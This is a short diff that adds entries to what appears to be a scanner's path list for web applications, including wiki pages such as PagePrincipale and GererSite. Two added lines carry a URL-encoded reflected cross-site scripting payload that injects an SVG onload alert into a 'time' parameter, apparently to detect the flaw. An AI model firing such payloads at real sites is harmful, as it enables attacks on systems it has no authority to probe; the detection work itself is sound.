@@ -26,3 +26,7 @@
 /?rest_route=/wpgmza/v1/markers/1/
 /?rest_route=/wpgmza/v1/markers/2/
 /?rest_route=/wpgmza/v1/markers/3/
+/?PagePrincipale/revisions
+/?GererSite/revisions
+/?PagePrincipale&time={{url_encode(timestamp)}}%22%3E%3Csvg%20onload%3Dalert(document.domain)%3E
+/?GererSite&time={{url_encode(timestamp)}}%22%3E%3Csvg%20onload%3Dalert(document.domain)%3E
